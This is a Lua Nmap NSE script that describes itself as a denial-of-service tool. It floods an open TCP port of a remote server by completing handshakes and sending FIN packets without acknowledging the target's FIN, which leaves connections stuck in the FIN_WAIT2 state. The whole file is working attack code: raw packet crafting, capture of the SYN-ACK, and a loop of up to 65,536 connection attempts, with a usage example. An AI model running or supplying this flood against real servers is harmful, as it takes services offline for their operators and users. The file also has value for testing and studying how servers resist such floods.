local dns = require "dns"
local nmap = require "nmap"
local packet = require "packet"
local ipOps = require "ipOps"
local stdnse = require "stdnse"

description = [[
This NSE preforms a DoS attack by FINWAIT2 Flooding a remote server

It follows the flow TCP as described here http://www.cs.northwestern.edu/~agupta/cs340/project2/TCPIP_State_Transition_Diagram.pdf
but doesn't send back the ACK to the FIN coming back from the target - causing it to stall on FINWAIT2
]]

---
-- @usage
-- sudo nmap -sn <target> --script finwait2-flood.nse --script-args='target=www.example.com'
--
-- @output
--
-- @args syn-flood.target a LAN or routed target responding to IP SYN Flood
--

author = "Noam Rathaus"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos"}

portrule = function(host, port)
	local service = nmap.get_port_state(host, port)

	return service ~= nil
		and service.state == "open"
		and port.protocol == "tcp"
		and port.state == "open"
end

local function fail(err) return stdnse.format_output(false, err) end

action = function(host, port)
  stdnse.debug1("Started on " .. host.ip .. " and " .. port.number)

  local ifname = nmap.get_interface() or host.interface
  if ( not(ifname) ) then
    return fail("Failed to determine the network interface name")
  end

  local target = ipOps.ip_to_bin(host.ip)
  if ( not(target) ) then
    local status
    status, target = dns.query(host, { dtype='A' })
    if ( not(status) ) then
      return fail(("Failed to lookup hostname: %s"):format(host))
    end
  else
    target = host
  end
  
  for count = 1, 65536, 1 do
   if count % 100 == 0 then
    stdnse.verbose1(("iteration: %d"):format(count))
   end
   tcpRequest(host, port.number, target, ifname)
  end

end

--- Updates a TCP Packet object
-- @param tcp The TCP object
local updatepkt = function(tcp, dport, sport, seq, flags, ack)
  if not sport then
   sport = math.random(0x401, 0xffff)
  end
  if not seq then
   seq = math.random(1, 0x7fffffff)
  end
  if not flags then
   flags = 2 --- SYN
  end
  
  stdnse.debug1("sport: %s, seq: %s, flags: %s, ack: %s", sport, seq, flags, ack )
    
  if ack then
   stdnse.debug1("ack: %s (%d)", ack, tcp.tcp_offset )
   tcp:set_u32(tcp.tcp_offset + 8, ack)
  end
  
  tcp:tcp_set_sport(sport)
  tcp:tcp_set_dport(dport)
  tcp:tcp_set_seq(seq)
  
  tcp:tcp_set_flags(flags)

  tcp:tcp_count_checksum(tcp.ip_len)
  tcp:ip_count_checksum()
  
  return sport, seq
end

local genericpkt = function(host, port, sport, seq, flags, ack)
  local pkt = stdnse.fromhex(
  "4500 002c 55d1 0000 8006 0000 0000 0000" ..
  "0000 0000 0000 0000 0000 0000 0000 0000" ..
  "6002 0c00 0000 0000 0204 05b4"
  )

  local tcp = packet.Packet:new(pkt, pkt:len())

  tcp:ip_set_bin_src(host.bin_ip_src)
  tcp:ip_set_bin_dst(host.bin_ip)
  
  sport, seq = updatepkt(tcp, port, sport, seq, flags, ack)

  return tcp, sport, seq
end

tcpRequest = function(host, port, addr, ifname)
  stdnse.sleep(1)

  local tcp_first, sport, first_seq = genericpkt(host, port, nil, nil, nil, nil)
  
  local listener_first = nmap.new_socket()
  local filter_first = 'tcp and src host ' .. host.ip .. ' and dst port ' .. sport .. ' and (tcp-syn|tcp-ack|tcp-fin) != 0'
  listener_first:set_timeout(100)
  stdnse.debug1(("filter_first: '%s', device: %s"):format(filter_first, host.interface))
  listener_first:pcap_open(host.interface, 100, true, filter_first)

  local iface = nmap.get_interface_info(ifname)
  local dnet = nmap.new_dnet()
  dnet:ethernet_open(iface.device)

  dnet:ip_open()
  stdnse.debug1("Sending SYN")
  dnet:ip_send(tcp_first.buf, host)

--- Capture the returning SYN ACK and respond to it
  local status_first, plen, l2_data, l3_data_first, time = listener_first:pcap_receive()
  stdnse.debug1(("status_first: %s, time: %s"):format(status_first, time))
  
  if status_first then
   --- We only care for the l3_data - https://github.com/nmap/nmap/blob/b222a0d7ee931734008591e16a17e6b320e849dd/nselib/packet.lua
   p_first = packet.Packet:new(l3_data_first, #l3_data_first)
   p_first:tcp_parse()
 
   --- Send the ACK 
   local tcp_second, sport, second_seq = genericpkt(host, port, sport, first_seq+1, 16, p_first.tcp_seq+1) -- ACK

   stdnse.debug1("ip_send->tcp_second")
   dnet:ip_send(tcp_second.buf, host)
   
   stdnse.sleep(1)

   stdnse.debug1("Sending FIN")
   local tcp_third, sport, third_seq = genericpkt(host, port, sport, first_seq+1, 1+16, p_first.tcp_seq+1) -- FIN + ACK

   dnet:ip_send(tcp_third.buf, host)
   
  end

  dnet:ethernet_close()
  listener_first:pcap_close()
  
  return 1
end
